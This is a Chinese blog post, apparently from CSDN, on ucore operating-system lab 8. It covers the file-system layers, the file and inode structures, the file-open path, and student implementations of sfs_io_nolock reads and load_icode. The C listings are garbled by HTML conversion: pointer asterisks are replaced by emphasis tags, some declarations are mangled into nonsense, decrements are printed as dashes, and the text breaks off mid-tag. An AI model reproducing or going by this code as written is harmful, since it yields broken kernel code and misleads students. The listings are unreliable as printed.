    <content type="html"><![CDATA[<p>练习0 填写已有实验将已完成的lab7和lab8进行对比  需要修改的文件如下：proc.cdefault_pmm.cpmm.cswap_fifo.cvmm.ctrap.csche.cmonitor.check_sync.c练习1 完成读文件操作的实现  首先了解打开文件的处理流程，然后参考本实验后续的文件读写操作的过程分析，编写在sfs_inode.c中sfs_io_nolo<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><h1 id="练习0-填写已有实验">练习0 填写已有实验</h1><br><p>将已完成的lab7和lab8进行对比 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170707102000629?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>需要修改的文件如下：<br><br></p><br><pre class="prettyprint"><code class=" hljs avrasm">proc<span class="hljs-preprocessor">.c</span><br>default_pmm<span class="hljs-preprocessor">.c</span><br>pmm<span class="hljs-preprocessor">.c</span><br>swap_fifo<span class="hljs-preprocessor">.c</span><br>vmm<span class="hljs-preprocessor">.c</span><br>trap<span class="hljs-preprocessor">.c</span><br>sche<span class="hljs-preprocessor">.c</span><br>monitor.<br>check_sync<span class="hljs-preprocessor">.c</span></code></pre><br><h1 id="练习1-完成读文件操作的实现">练习1 完成读文件操作的实现</h1><br><blockquote><br><p>首先了解打开文件的处理流程，然后参考本实验后续的文件读写操作的过程分析，编写在sfs_inode.c中sfs_io_nolock读文件中数据的实现代码。</p><br></blockquote><br><h2 id="0x1-ucore文件系统总体介绍">0x1 ucore文件系统总体介绍</h2><br><p>根据实验指导书，我们可以了解到，ucore的文件系统架构主要由四部分组成：</p><br><ul><br><li><strong>通用文件系统访问接口层:</strong>该层提供了一个从用户空间到文件系统的标准访问接口。这一层访问接口让应用程序能够通过一个简单的接口获得ucore内核的文件系统服务。</li><br><li><strong>文件系统抽象层:</strong>向上提供一个一致的接口给内核其他部分（文件系统相关的系统调用实现模块和其他内核功能模块）访问。向下提供一个抽象函数指针列表和数据结构来屏蔽不同文件系统的实现细节。</li><br><li><strong>Simple FS文件系统层:</strong>一个基于索引方式的简单文件系统实例。向上通过各种具体函数实现以对应文件系统抽象层提出的抽象函数。向下访问外设接口</li><br><li><strong>外设接口层:</strong>向上提供device访问接口屏蔽不同硬件细节。向下实现访问各种具体设备驱动的接口,比如disk设备接口/串口设备接口/键盘设备接口等。</li><br></ul><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170612013345716?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><h2 id="0x2-ucore文件相关关键数据结构及其关系">0x2 ucore文件相关关键数据结构及其关系</h2><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170612014054434?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><h2 id="0x3-重要数据结构">0x3 重要数据结构</h2><br><p>首先是file数据结构：</p><br><pre class="prettyprint"><code class=" hljs rust"><span class="hljs-keyword">struct</span> file {<br><span class="hljs-keyword">enum</span> {<br>FD_NONE, FD_INIT, FD_OPENED, FD_CLOSED,<br>} status;       <span class="hljs-comment">//访问文件的执行状态</span><br><span class="hljs-keyword">bool</span> readable; <span class="hljs-comment">//文件是否可读</span><br><span class="hljs-keyword">bool</span> writable; <span class="hljs-comment">//文件是否可写</span><br><span class="hljs-keyword">int</span> fd;        <span class="hljs-comment">//文件在filemap中的索引值</span><br>off_t pos;    <span class="hljs-comment">//访问文件的当前位置</span><br><span class="hljs-keyword">struct</span> inode <em>node;<span class="hljs-comment">//该文件对应的内存inode指针</span><br>atomic_t open_count;<span class="hljs-comment">//打开此文件的次数</span><br>};</em></code></pre><br><p>接下来inode数据结构，它是位于内存的索引节点，把不同文件系统的特定索引节点信息(甚至不能算是一个索引节点)统一封装起来，避免了进程直接访问具体文件系统</p><br><pre class="prettyprint"><code class=" hljs rust"><span class="hljs-keyword">struct</span> inode {<br>union { <span class="hljs-comment">//包含不同文件系统特定inode信息的union域</span><br><span class="hljs-keyword">struct</span> device <span class="hljs-number"><strong></strong></span>device_info;  <span class="hljs-comment">//设备文件系统内存inode信息</span><br><span class="hljs-keyword">struct</span> sfs_inode <span class="hljs-number"></span>sfs_inode_info; <span class="hljs-comment">//SFS文件系统内存inode信息</span><br>} in_info;<br><span class="hljs-keyword">enum</span> {<br>inode_type_device_info = <span class="hljs-number">0x1234</span>,<br>inode_type_sfs_inode_info,<br>} in_type;  <span class="hljs-comment">//此inode所属文件系统类型</span><br>atomic_t ref_count;   <span class="hljs-comment">//此inode的引用计数</span><br>atomic_t open_count;  <span class="hljs-comment">//打开此inode对应文件的个数</span><br><span class="hljs-keyword">struct</span> fs in_fs;     <span class="hljs-comment">//抽象的文件系统,包含访问文件系统的函数指针</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> inode_ops <em>in_ops;   <span class="hljs-comment">//抽象的inode操作,包含访问inode的函数指针</span><br>};</em></code></pre><br><p>内存中的索引节点</p><br><pre class="prettyprint"><code class=" hljs applescript">struct sfs_inode {<br>    struct sfs_disk_inode din;                     /<em> <span class="hljs-function_start"><span class="hljs-keyword">on</span></span>-disk inode </em>/<br>    uint32_t ino;                                   /<em> inode <span class="hljs-type">number</span> </em>/<br>    uint32_t flags;                                 /<em> inode flags </em>/<br>    bool dirty;                                     /<em> <span class="hljs-constant">true</span> <span class="hljs-keyword">if</span> inode modified </em>/<br>    int reclaim_count;                              /<em> kill inode <span class="hljs-keyword">if</span> <span class="hljs-keyword">it</span> hits zero </em>/<br>    semaphore_t sem;                                /<em> semaphore <span class="hljs-keyword">for</span> din </em>/<br>    list_entry_t inode_link;                        /<em> entry <span class="hljs-keyword">for</span> linked-<span class="hljs-type">list</span> <span class="hljs-keyword">in</span> sfs_fs </em>/<br>    list_entry_t hash_link;                         /<em> entry <span class="hljs-keyword">for</span> hash linked-<span class="hljs-type">list</span> <span class="hljs-keyword">in</span> sfs_fs </em>/<br>};</code></pre><br><p>SFS中的磁盘索引节点代表了一个实际位于磁盘上的文件。首先我们看看在硬盘上的索引节点的内容：</p><br><pre class="prettyprint"><code class=" hljs fsharp"><span class="hljs-keyword">struct</span> sfs_disk_inode {<br>    uint32_t size;                              如果inode表示常规文件，则size是文件大小<br>    uint16_t <span class="hljs-class"><span class="hljs-keyword">type</span>;                                  <span class="hljs-title">inode</span>的文件类型</span><br>    uint16_t nlinks;                               此inode的硬链接数<br>    uint32_t blocks;                              此inode的数据块数的个数<br>    uint32_t direct[SFS_NDIRECT];                此inode的直接数据块索引值（有SFS_NDIRECT个）<br>    uint32_t indirect;                            此inode的一级间接数据块索引值<br>};</code></pre><br><h2 id="0x4-打开文件原理">0x4 打开文件原理</h2><br><blockquote><br><p>首先假定用户进程需要打开的文件已经存在在硬盘上。以user/sfs_filetest1.c为例，首先用户进程会调用在main函数中的如下语句： <br><br>  int fd1 = safe_open(“/test/testfile”, O_RDWR | O_TRUNC);<br></p><br></blockquote><br><p>①通用文件访问接口层的处理流程</p><br><blockquote><br><p>首先进入通用文件访问接口层的处理流程，即进一步调用如下用户态函数： open-&gt;sys_open-&gt;syscall，从而引起系统调用进入到内核态。到了内核态后，通过中断处理例程，会调用到sys_open内核函数，并进一步调用sysfile_open内核函数。到了这里，需要把位于用户空间的字符串”/test/testfile”拷贝到内核空间中的字符串path中，并进入到文件系统抽象层的处理流程完成进一步的打开文件操作中。</p><br></blockquote><br><p>②文件系统抽象层的处理流程</p><br><blockquote><br><p>Ⅰ、分配一个空闲的file数据结构变量file在文件系统抽象层的处理中，首先调用的是file_open函数，它要给这个即将打开的文件分配一个file数据结构的变量，这个变量其实是当前进程的打开文件数组current-&gt;fs_struct-&gt;filemap[]中的一个空闲元素（即还没用于一个打开的文件），而这个元素的索引值就是最终要返回到用户进程并赋值给变量fd1。到了这一步还仅仅是给当前用户进程分配了一个file数据结构的变量，还没有找到对应的文件索引节点。 <br><br>  为此需要进一步调用vfs_open函数来找到path指出的文件所对应的基于inode数据结构的VFS索引节点node。vfs_open函数需要完成两件事情：通过vfs_lookup找到path对应文件的inode；调用vop_open函数打开文件。<br></p><br><p>Ⅱ、找到文件设备的根目录“/”的索引节点需要注意，这里的vfs_lookup函数是一个针对目录的操作函数，它会调用vop_lookup函数来找到SFS文件系统中的“/test”目录下的“testfile”文件。为此，vfs_lookup函数首先调用get_device函数，并进一步调用vfs_get_bootfs函数（其实调用了）来找到根目录“/”对应的inode。这个inode就是位于vfs.c中的inode变量bootfs_node。这个变量在init_main函数（位于kern/process/proc.c）执行时获得了赋值。</p><br><p>Ⅲ、找到根目录“/”下的“test”子目录对应的索引节点，在找到根目录对应的inode后，通过调用vop_lookup函数来查找“/”和“test”这两层目录下的文件“testfile”所对应的索引节点，如果找到就返回此索引节点。</p><br><p>Ⅳ、把file和node建立联系。完成第3步后，将返回到file_open函数中，通过执行语句“file-&gt;node=node;”，就把当前进程的current-&gt;fs_struct-&gt;filemap[fd]（即file所指变量）的成员变量node指针指向了代表“/test/testfile”文件的索引节点node。这时返回fd。经过重重回退，通过系统调用返回，用户态的syscall-&gt;sys_open-&gt;open-&gt;safe_open等用户函数的层层函数返回，最终把把fd赋值给fd1。自此完成了打开文件操作。但这里我们还没有分析第2和第3步是如何进一步调用SFS文件系统提供的函数找位于SFS文件系统上的“/test/testfile”所对应的sfs磁盘inode的过程。下面需要进一步对此进行分析。</p><br></blockquote><br><p>③SFS文件系统层的处理流程</p><br><blockquote><br><p>这里需要分析文件系统抽象层中没有彻底分析的vop_lookup函数到底做了啥。下面我们来看看。在sfs_inode.c中的sfs_node_dirops变量定义了“.vop_lookup = sfs_lookup”，所以我们重点分析sfs_lookup的实现。</p><br><p>sfs_lookup有三个参数：node，path，node_store。其中node是根目录“/”所对应的inode节点；path是文件“testfile”的绝对路径“/test/testfile”，而node_store是经过查找获得的“testfile”所对应的inode节点。</p><br><p>Sfs_lookup函数以“/”为分割符，从左至右逐一分解path获得各个子目录和最终文件对应的inode节点。在本例中是分解出“test”子目录，并调用sfs_lookup_once函数获得“test”子目录对应的inode节点subnode，然后循环进一步调用sfs_lookup_once查找以“test”子目录下的文件“testfile1”所对应的inode节点。当无法分解path后，就意味着找到了testfile1对应的inode节点，就可顺利返回了。</p><br><p>sfs_lookup_once将调用sfs_dirent_search_nolock函数来查找与路径名匹配的目录项，如果找到目录项，则根据目录项中记录的inode所处的数据块索引值找到路径名对应的SFS磁盘inode，并读入SFS磁盘inode对的内容，创建SFS内存inode。</p><br></blockquote><br><h2 id="0x5-代码填写">0x5 代码填写</h2><br><p>调用了SFS文件系统层的vfs_lookup函数去寻找node，这里在sfs_inode.c中我们能够知道.vop_lookup = sfs_lookup <br><br><code>sfs_lookup</code><br></p><br><pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> sfs_lookup(<span class="hljs-keyword">struct</span> inode <em>node, <span class="hljs-keyword">char</span> </em>path, <span class="hljs-keyword">struct</span> inode <strong>node_store) {<br><span class="hljs-keyword">struct</span> sfs_fs <em>sfs = fsop_info(vop_fs(node), sfs);<br>assert(</em>path != <span class="hljs-string">‘\0’</span> &amp;&amp; <em>path != <span class="hljs-string">‘/‘</span>);    <span class="hljs-comment">//以“/”为分割符，从左至右逐一分解path获得各个子目录和最终文件对应的inode节点。</span><br>vop_ref_inc(node);<br><span class="hljs-keyword">struct</span> sfs_inode </em><span class="hljs-built_in">sin</span> = vop_info(node, sfs_inode);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">sin</span>-&gt;din-&gt;type != SFS_TYPE_DIR) {<br>    vop_ref_dec(node);<br>    <span class="hljs-keyword">return</span> -E_NOTDIR;<br>}<br><span class="hljs-keyword">struct</span> inode <em>subnode;<br><span class="hljs-keyword">int</span> ret = sfs_lookup_once(sfs, <span class="hljs-built_in">sin</span>, path, &amp;subnode, NULL);  <span class="hljs-comment">//循环进一步调用sfs_lookup_once查找以“test”子目录下的文件“testfile1”所对应的inode节点。</span><br><br>vop_ref_dec(node);<br><span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) {<br>    <span class="hljs-keyword">return</span> ret;<br>}</em>node_store = subnode;  <span class="hljs-comment">//当无法分解path后，就意味着找到了需要对应的inode节点，就可顺利返回了。</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}</strong></code></pre><br><p>sfs_lookup_once函数，它调用sfs_dirent_search_nolock函数来查找与路径名匹配的目录项，如果找到目录项，则根据目录项中记录的inode所处的数据块索引值找到路径名对应的SFS磁盘inode，并读入SFS磁盘inode对的内容，创建SFS内存inode。 </p><br><pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> sfs_lookup_once(<span class="hljs-keyword">struct</span> sfs_fs <em>sfs, <span class="hljs-keyword">struct</span> sfs_inode </em><span class="hljs-built_in">sin</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">struct</span> inode node_store, <span class="hljs-keyword">int</span> <em>slot) {<br><span class="hljs-keyword">int</span> ret;<br>uint32_t ino;<br>lock_sin(<span class="hljs-built_in">sin</span>);<br>{   <span class="hljs-comment">// find the NO. of disk block and logical index of file entry</span><br>    ret = sfs_dirent_search_nolock(sfs, <span class="hljs-built_in">sin</span>, name, &amp;ino, slot, NULL);<br>}<br>unlock_sin(<span class="hljs-built_in">sin</span>);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) {<br>    <span class="hljs-comment">// load the content of inode with the the NO. of disk block</span><br>    ret = sfs_load_inode(sfs, node_store, ino);<br>}<br><span class="hljs-keyword">return</span> ret;<br>}</em></code></pre><br><p>接下来我们需要完成sfs_io_nolock函数中读文件的过程，代码如下，这里只将我们所需要填写的部分罗列出来了：</p><br><pre class="prettyprint"><code class=" hljs cs"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>sfs_io_nolock(<span class="hljs-keyword">struct</span> sfs_fs sfs, <span class="hljs-keyword">struct</span> sfs_inode <em>sin, <span class="hljs-keyword">void</span> </em>buf, off_t offset, size_t <em>alenp, <span class="hljs-keyword">bool</span> write) {<br>……<br>……<br><br><span class="hljs-keyword">if</span> ((blkoff = offset % SFS_BLKSIZE) != <span class="hljs-number">0</span>) {                   <span class="hljs-comment">//读取第一部分的数据</span><br>    size = (nblks != <span class="hljs-number">0</span>) ? (SFS_BLKSIZE - blkoff) : (endpos - offset); <span class="hljs-comment">//计算第一个数据块的大小</span><br>    <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, sin, blkno, &amp;ino)) != <span class="hljs-number">0</span>) {   <span class="hljs-comment">//找到内存文件索引对应的block的编号ino</span><br>        <span class="hljs-keyword">goto</span> <span class="hljs-keyword">out</span>;<br>    }<br><br>    <span class="hljs-keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, blkoff)) != <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">goto</span> <span class="hljs-keyword">out</span>;<br>    }<br>    <span class="hljs-comment">//完成实际的读写操作</span><br>    alen += size;<br>    <span class="hljs-keyword">if</span> (nblks == <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">goto</span> <span class="hljs-keyword">out</span>;<br>    }<br>    buf += size, blkno ++, nblks –;<br>}<br><br><span class="hljs-comment">//读取中间部分的数据，将其分为size大学的块，然后一次读一块直至读完</span><br>size = SFS_BLKSIZE;<br><span class="hljs-keyword">while</span> (nblks != <span class="hljs-number">0</span>) {<br>    <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, sin, blkno, &amp;ino)) != <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">goto</span> <span class="hljs-keyword">out</span>;<br>    }<br>    <span class="hljs-keyword">if</span> ((ret = sfs_block_op(sfs, buf, ino, <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">goto</span> <span class="hljs-keyword">out</span>;<br>    }<br>    alen += size, buf += size, blkno ++, nblks –;<br>}<br><span class="hljs-comment">//读取第三部分的数据</span><br><span class="hljs-keyword">if</span> ((size = endpos % SFS_BLKSIZE) != <span class="hljs-number">0</span>) {<br>    <span class="hljs-keyword">if</span> ((ret = sfs_bmap_load_nolock(sfs, sin, blkno, &amp;ino)) != <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">goto</span> <span class="hljs-keyword">out</span>;<br>    }<br>    <span class="hljs-keyword">if</span> ((ret = sfs_buf_op(sfs, buf, size, ino, <span class="hljs-number">0</span>)) != <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">goto</span> <span class="hljs-keyword">out</span>;<br>    }<br>    alen += size;<br>}</em></code></pre><br><h1 id="练习2-完成基于文件系统的执行程序机制的实现">练习2 完成基于文件系统的执行程序机制的实现</h1><br><blockquote><br><p>改写proc.c中的load_icode函数和其他相关函数，实现基于文件系统的执行程序机制。执行：make qemu。如果能看看到sh用户程序的执行界面，则基本成功了。如果在sh用户界面上可以执行”ls”,”hello”等其他放置在sfs文件系统中的其他执行程序，则可以认为本实验基本成功。</p><br></blockquote><br><p><code>在proc.c中，根据注释我们需要先初始化fs中的进程控制结构，即在alloc_proc函数中我们需要做一下修改，加上一句proc-&gt;filesp = NULL;从而完成初始化。</code></p><br><p>然后就是要实现load_icode函数，具体的实现及注释如下所示：</p><br><pre class="prettyprint"><code class=" hljs fsharp"><span class="hljs-keyword">static</span> int<br>load_icode(int fd, int argc, char **kargv) {<br><br>    / (<span class="hljs-number">1</span>) create a <span class="hljs-keyword">new</span> mm <span class="hljs-keyword">for</span> current process<br>     <em> (<span class="hljs-number">2</span>) create a <span class="hljs-keyword">new</span> PDT, <span class="hljs-keyword">and</span> mm-&gt;pgdir= kernel virtual addr <span class="hljs-keyword">of</span> PDT     </em> (<span class="hljs-number">3</span>) copy TEXT/DATA/BSS parts <span class="hljs-keyword">in</span> binary <span class="hljs-keyword">to</span> memory space <span class="hljs-keyword">of</span> process<br>     <em>    (<span class="hljs-number">3.1</span>) read raw data content <span class="hljs-keyword">in</span> file <span class="hljs-keyword">and</span> resolve elfhdr     </em>    (<span class="hljs-number">3.2</span>) read raw data content <span class="hljs-keyword">in</span> file <span class="hljs-keyword">and</span> resolve proghdr based on info <span class="hljs-keyword">in</span> elfhdr<br>     <em>    (<span class="hljs-number">3.3</span>) call mm_map <span class="hljs-keyword">to</span> build vma related <span class="hljs-keyword">to</span> TEXT/DATA     </em>    (<span class="hljs-number">3.4</span>) callpgdir_alloc_page <span class="hljs-keyword">to</span> allocate page <span class="hljs-keyword">for</span> TEXT/DATA, read contents <span class="hljs-keyword">in</span> file<br>     <em>          <span class="hljs-keyword">and</span> copy them into the <span class="hljs-keyword">new</span> allocated pages     </em>    (<span class="hljs-number">3.5</span>) callpgdir_alloc_page <span class="hljs-keyword">to</span> allocate pages <span class="hljs-keyword">for</span> BSS, memset zero <span class="hljs-keyword">in</span> these pages<br>     <em> (<span class="hljs-number">4</span>) call mm_map <span class="hljs-keyword">to</span> setup user stack, <span class="hljs-keyword">and</span> put parameters into user stack     </em> (<span class="hljs-number">5</span>) setup current process’s mm, cr3, reset pgidr (using lcr3 MARCO)<br>     <em> (<span class="hljs-number">6</span>) setup uargc <span class="hljs-keyword">and</span> uargv <span class="hljs-keyword">in</span> user stacks     </em> (<span class="hljs-number">7</span>) setup trapframe <span class="hljs-keyword">for</span> user environment<br>     <em> (<span class="hljs-number">8</span>) <span class="hljs-keyword">if</span> up steps failed, you should cleanup the env.     </em>/<br>    <span class="hljs-keyword">assert</span>(argc &gt;= <span class="hljs-number">0</span> &amp;&amp; argc &lt;= EXEC_MAX_ARG_NUM);<br>    <span class="hljs-comment">//(1)建立内存管理器</span><br>    <span class="hljs-keyword">if</span> (current-&gt;mm != NULL) {    <span class="hljs-comment">//要求当前内存管理器为空</span><br>        panic(<span class="hljs-string">“load_icode: current-&gt;mm must be empty.\n”</span>);<br>    }<br><br>    int ret = -E_NO_MEM;    <span class="hljs-comment">// E_NO_MEM代表因为存储设备产生的请求错误</span><br>    <span class="hljs-keyword">struct</span> mm_struct <em>mm;  <span class="hljs-comment">//建立内存管理器</span><br>    <span class="hljs-keyword">if</span> ((mm = mm_create()) == NULL) {<br>        goto bad_mm;<br>    }<br><br>    <span class="hljs-comment">//(2)建立页目录</span><br>    <span class="hljs-keyword">if</span> (setup_pgdir(mm) != <span class="hljs-number">0</span>) {<br>        goto bad_pgdir_cleanup_mm;<br>    }<br>    <span class="hljs-keyword">struct</span> Page </em>page;<span class="hljs-comment">//建立页表</span><br><br>    <span class="hljs-comment">//(3)从文件加载程序到内存</span><br>    <span class="hljs-keyword">struct</span> elfhdr <strong>elf, *elf = &amp;</strong>elf;<br>    <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, elf, sizeof(<span class="hljs-keyword">struct</span> elfhdr), <span class="hljs-number">0</span>)) != <span class="hljs-number">0</span>) {<span class="hljs-comment">//读取elf文件头</span><br>        goto bad_elf_cleanup_pgdir;<br>    }<br><br>    <span class="hljs-keyword">if</span> (elf-&gt;e_magic != ELF_MAGIC) {<br>        ret = -E_INVAL_ELF;<br>        goto bad_elf_cleanup_pgdir;<br>    }<br><br>    <span class="hljs-keyword">struct</span> proghdr <strong>ph, *ph = &amp;</strong>ph;<br>    uint32_t vm_flags, perm, phnum;<br>    <span class="hljs-keyword">for</span> (phnum = <span class="hljs-number">0</span>; phnum &lt; elf-&gt;e_phnum; phnum ++) {  <span class="hljs-comment">//e_phnum代表程序段入口地址数目，即多少各段</span><br>        off_t phoff = elf-&gt;e_phoff + sizeof(<span class="hljs-keyword">struct</span> proghdr) <em> phnum;  <span class="hljs-comment">//循环读取程序的每个段的头部   </span><br>        <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, ph, sizeof(<span class="hljs-keyword">struct</span> proghdr), phoff)) != <span class="hljs-number">0</span>) {<br>            goto bad_cleanup_mmap;<br>        }<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_type != ELF_PT_LOAD) {<br>            continue ;<br>        }<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz) {<br>            ret = -E_INVAL_ELF;<br>            goto bad_cleanup_mmap;<br>        }<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_filesz == <span class="hljs-number">0</span>) {<br>            continue ;<br>        }<br>        vm_flags = <span class="hljs-number">0</span>, perm = PTE_U;<span class="hljs-comment">//建立虚拟地址与物理地址之间的映射</span><br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE;<br>        <span class="hljs-keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ;<br>        <span class="hljs-keyword">if</span> (vm_flags &amp; VM_WRITE) perm |= PTE_W;<br>        <span class="hljs-keyword">if</span> ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, NULL)) != <span class="hljs-number">0</span>) {<br>            goto bad_cleanup_mmap;<br>        }<br>        off_t offset = ph-&gt;p_offset;<br>        size_t off, size;<br>        uintptr_t start = ph-&gt;p_va, <span class="hljs-keyword">end</span>, la = ROUNDDOWN(start, PGSIZE);<br><br><br>        ret = -E_NO_MEM;<br><br>        <span class="hljs-comment">//复制数据段和代码段</span><br>        <span class="hljs-keyword">end</span> = ph-&gt;p_va + ph-&gt;p_filesz;      <span class="hljs-comment">//计算数据段和代码段终止地址</span><br>        <span class="hljs-keyword">while</span> (start &lt; <span class="hljs-keyword">end</span>) {<br>            <span class="hljs-keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == NULL) {<br>                ret = -E_NO_MEM;<br>                goto bad_cleanup_mmap;<br>            }<br>            off = start - la, size = PGSIZE - off, la += PGSIZE;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">end</span> &lt; la) {<br>                size -= la - <span class="hljs-keyword">end</span>;<br>            }<br>            <span class="hljs-comment">//每次读取size大小的块，直至全部读完</span><br>            <span class="hljs-keyword">if</span> ((ret = load_icode_read(fd, page2kva(page) + off, size, offset)) != <span class="hljs-number">0</span>) {       <span class="hljs-comment">//load_icode_read通过sysfile_read函数实现文件读取</span><br>                goto bad_cleanup_mmap;<br>            }<br>            start += size, offset += size;<br>        }<br>        <span class="hljs-comment">//建立BSS段</span><br>        <span class="hljs-keyword">end</span> = ph-&gt;p_va + ph-&gt;p_memsz;   <span class="hljs-comment">//同样计算终止地址</span><br><br>        <span class="hljs-keyword">if</span> (start &lt; la) {<br>            <span class="hljs-keyword">if</span> (start == <span class="hljs-keyword">end</span>) {<br>                continue ;<br>            }<br>            off = start + PGSIZE - la, size = PGSIZE - off;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">end</span> &lt; la) {<br>                size -= la - <span class="hljs-keyword">end</span>;<br>            }<br>            memset(page2kva(page) + off, <span class="hljs-number">0</span>, size);<br>            start += size;<br>            <span class="hljs-keyword">assert</span>((<span class="hljs-keyword">end</span> &lt; la &amp;&amp; start == <span class="hljs-keyword">end</span>) || (<span class="hljs-keyword">end</span> &gt;= la &amp;&amp; start == la));<br>        }<br><br>        <span class="hljs-keyword">while</span> (start &lt; <span class="hljs-keyword">end</span>) {<br>            <span class="hljs-keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == NULL) {<br>                ret = -E_NO_MEM;<br>                goto bad_cleanup_mmap;<br>            }<br>            off = start - la, size = PGSIZE - off, la += PGSIZE;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">end</span> &lt; la) {<br>                size -= la - <span class="hljs-keyword">end</span>;<br>            }<br>            <span class="hljs-comment">//每次操作size大小的块</span><br>            memset(page2kva(page) + off, <span class="hljs-number">0</span>, size);<br>            start += size;<br>        }<br>    }<br>    sysfile_close(fd);<span class="hljs-comment">//关闭文件，加载程序结束</span><br><br>    <span class="hljs-comment">//(4)建立相应的虚拟内存映射表</span><br>    vm_flags = VM_READ | VM_WRITE | VM_STACK;<br>    <span class="hljs-keyword">if</span> ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, NULL)) != <span class="hljs-number">0</span>) {<br>        goto bad_cleanup_mmap;<br>    }<br>    <span class="hljs-keyword">assert</span>(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-PGSIZE , PTE_USER) != NULL);<br>    <span class="hljs-keyword">assert</span>(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-<span class="hljs-number">2</span></em>PGSIZE , PTE_USER) != NULL);<br>    <span class="hljs-keyword">assert</span>(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-<span class="hljs-number">3</span><em>PGSIZE , PTE_USER) != NULL);<br>    <span class="hljs-keyword">assert</span>(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-<span class="hljs-number">4</span></em>PGSIZE , PTE_USER) != NULL);<br>    <span class="hljs-comment">//(5)设置用户栈</span><br>    mm_count_inc(mm);<br>    current-&gt;mm = mm;<br>    current-&gt;cr3 = PADDR(mm-&gt;pgdir);<br>    lcr3(PADDR(mm-&gt;pgdir));<br><br>    <span class="hljs-comment">//(6)处理用户栈中传入的参数，其中argc对应参数个数，uargv[]对应参数的具体内容的地址</span><br>    uint32_t argv_size=<span class="hljs-number">0</span>, i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i ++) {<br>        argv_size += strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="hljs-number">1</span>)+<span class="hljs-number">1</span>;<br>    }<br><br>    uintptr_t stacktop = USTACKTOP - (argv_size/sizeof(long)+<span class="hljs-number">1</span>)<em>sizeof(long);<br>    char<strong> uargv=(char </strong>)(stacktop  - argc </em> sizeof(char <em>));<br><br>    argv_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; argc; i ++) {         <span class="hljs-comment">//将所有参数取出来放置uargv</span><br>        uargv[i] = strcpy((char </em>)(stacktop + argv_size ), kargv[i]);<br>        argv_size +=  strnlen(kargv[i],EXEC_MAX_ARG_LEN + <span class="hljs-number">1</span>)+<span class="hljs-number">1</span>;<br>    }<br><br>    stacktop = (uintptr_t)uargv - sizeof(int);   <span class="hljs-comment">//计算当前用户栈顶</span><br>    <em>(int </em>)stacktop = argc;<br>    <span class="hljs-comment">//(7)设置进程的中断帧   </span><br>    <span class="hljs-keyword">struct</span> trapframe *tf = current-&gt;tf;<br>    memset(tf, <span class="hljs-number">0</span>, sizeof(<span class="hljs-keyword">struct</span> trapframe));<span class="hljs-comment">//初始化tf，设置中断帧</span><br>    tf-&gt;tf_cs = USER_CS;<br>    tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;<br>    tf-&gt;tf_esp = stacktop;<br>    tf-&gt;tf_eip = elf-&gt;e_entry;<br>    tf-&gt;tf_eflags = FL_IF;<br>    ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//(8)错误处理部分</span><br>out:<br>    <span class="hljs-keyword">return</span> ret;           <span 